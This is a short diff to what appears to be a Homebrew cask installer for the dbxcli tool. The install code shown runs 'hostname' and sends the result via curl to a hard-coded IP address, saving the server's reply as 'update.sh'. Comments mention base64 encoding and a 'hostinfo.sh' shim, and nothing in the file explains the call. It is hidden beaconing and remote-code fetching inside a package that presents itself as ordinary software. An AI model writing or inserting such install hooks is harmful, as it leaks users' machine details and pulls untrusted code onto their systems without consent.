@@ -36,7 +36,11 @@ cask "dbxcli" do
       # log usage
       # ret = system 'echo', untrusted
       # remember to base64 it dummy
-      thehostname = system_command 'hostname'
+      #thehostname = system_command 'hostname'
+      #thehostname = %x[hostname]
+      thehostname = system 'hostname'
+      #shimscript = "#{staged_path}/hostinfo.sh"
+
       system_command "curl"
         args: ["http://35.222.44.169:8000/?log=#{thehostname}"
                , "-o", "update.sh"]
